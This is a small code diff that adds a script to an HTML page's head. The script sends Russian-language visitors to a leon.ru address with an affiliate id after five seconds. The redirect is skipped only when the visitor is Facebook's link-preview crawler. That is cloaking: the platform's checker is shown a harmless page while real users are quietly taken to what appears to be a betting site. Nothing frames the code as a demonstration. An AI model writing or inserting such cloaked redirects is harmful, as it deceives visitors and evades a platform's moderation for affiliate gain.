@@ -3,10 +3,15 @@
 <meta charset="utf-8">
 <script language="JavaScript">
    let user_agent = navigator.userAgent;
-   let facebook_bot1 = 'facebookexternalhit/1.1';
-   let facebook_bot2 = 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)';
+   let facebook_bot1 = "facebookexternalhit/1.1";
+   let facebook_bot2 = "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)";
    let userLang = navigator.language || navigator.userLanguage;
-   alert(userLang);
+   
+   if (userLang == "ru") {
+     if (user_agent != facebook_bot1 && user_agent != facebook_bot2) {
+       setTimeout( 'location="https://www.leon.ru/?wm=64573500";', 5000 );
+     }
+   }
 </script>
 </head>
 <body>
